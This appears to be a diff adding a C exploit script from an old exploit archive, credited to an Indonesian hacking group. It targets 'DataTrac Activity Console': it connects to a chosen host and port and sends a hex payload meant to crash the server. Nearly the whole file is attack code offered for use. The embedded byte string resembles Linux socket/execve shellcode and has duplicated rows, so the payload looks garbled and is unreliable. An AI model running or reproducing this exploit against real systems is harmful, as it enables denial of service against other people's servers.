@@ -1,0 +1,123 @@
+/*
+
+DataTrac Activity Console DoS Exploit
+----------------------------------------
+ INFGP - Hacking&security Research
+
+Resolve host... [OK]
+[+] Connecting... [OK]
+Target locked
+Sending bad procedure... [OK]
+[+] Server DoS'ed
+
+Greats: Infam0us Gr0up,Yudha(mephisthopeles),Kavling Community,
+1st Indonesian Security,Jasakom,ECHO,etc..betst reagrds t0 whell.
+Info: 98.to/infamous
+
+*/
+
+#include <string.h>
+#include <winsock2.h>
+#include <stdio.h>
+
+#pragma comment(lib, "ws2_32.lib")
+
+char doscore[] =
+"\xeb\x6e\x5e\x29\xc0\x89\x46\x10"
+"\x40\x89\xc3\x89\x46\x0c\x40\x89"
+"\x46\x08\x8d\x4e\x08\xb0\x66\xcd"
+"\x40\x89\xc3\x89\x46\x0c\x40\x89"
+"\x46\x08\x8d\x4e\x08\xb0\x66\xcd"
+"\x80\x43\xc6\x46\x10\x10\x88\x46"
+"\x08\x31\xc0\x31\xd2\x89\x46\x18"
+"\xb0\x90\x66\x89\x46\x16\x8d\x4e"
+"\x14\x89\x4e\x0c\x8d\x4e\x08\xb0"
+"\x66\xcd\x80\x89\x5e\x0c\x43\x43"
+"\xb0\x66\xcd\x80\x89\x56\x0c\x89"
+"\x08\x31\xc0\x31\xd2\x89\x46\x18"
+"\xb0\x90\x66\x89\x46\x16\x8d\x4e"
+"\x14\x89\x4e\x0c\x8d\x4e\x08\xb0"
+"\x56\x10\xb0\x66\x43\xcd\x80\x86"
+"\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0"
+"\x14\x89\x4e\x0c\x8d\x4e\x08\xb0"
+"\x66\xcd\x80\x89\x5e\x0c\x43\x43"
+"\xb0\x66\xcd\x80\x89\x56\x0c\x89"
+"\x56\x10\xb0\x66\x43\xcd\x80\x86"
+"\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0"
+"\x3f\x41\xcd\x80\xb0\x3f\x41\xcd"
+"\x80\x88\x56\x07\x89\x76\x0c\x87"
+"\xf3\x8d\x4b\x0c\xb0\x0b\xcd\x80"
+"\xe8\x8d\xff\xff";
+
+int main(int argc, char *argv[])
+{
+WSADATA wsaData;
+WORD wVersionRequested;
+struct hostent *pTarget;
+struct sockaddr_in sock;
+char *target;
+int port,bufsize;
+SOCKET inetdos;
+
+if (argc < 2)
+{
+printf("     DataTrac Activity Console DoS Exploit \n", argv[0]);
+printf("  ------------------------------------------\n", argv[0]);
+printf("      INFGP - Hacking&Security Research\n\n", argv[0]);
+printf("[-]Usage: %s [target] [source port]\n", argv[0]);
+printf("[?]Exam: %s localhost 13\n", argv[0]);
+exit(1);
+}
+
+wVersionRequested = MAKEWORD(1, 1);
+if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;
+
+target = argv[1];
+port = 80;
+
+if (argc >= 3) port = atoi(argv[2]);
+bufsize = 1024;
+if (argc >= 4) bufsize = atoi(argv[3]);
+
+inetdos = socket(AF_INET, SOCK_STREAM, 0);
+if(inetdos==INVALID_SOCKET)
+{
+printf("Socket ERROR \n");
+exit(1);
+}
+printf("     DataTrac Activity Console DoS Exploit \n", argv[0]);
+printf("  ------------------------------------------\r\n\n", argv[0]);
+printf("Resolve host... ");
+if ((pTarget = gethostbyname(target)) == NULL)
+{
+printf("FAILED \n", argv[0]);
+exit(1);
+}
+printf("[OK]\n ");
+memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
+sock.sin_family = AF_INET;
+sock.sin_port = htons((USHORT)port);
+
+printf("[+] Connecting... ");
+if ( (connect(inetdos, (struct sockaddr *)&sock, sizeof (sock) )))
+{
+printf("FAILED\n");
+exit(1);
+}
+printf("[OK]\n");
+printf("Target locked\n");
+printf("Sending bad procedure... ");
+if (send(inetdos, doscore, sizeof(doscore)-1, 0) == -1)
+{
+printf("ERROR\n");
+closesocket(inetdos);
+exit(1);
+}
+printf("[OK]\n ");
+printf("[+] Server DoS'ed\n");
+closesocket(inetdos);
+WSACleanup();
+return 0;
+}
+
+// milw0rm.com [2005-05-06]
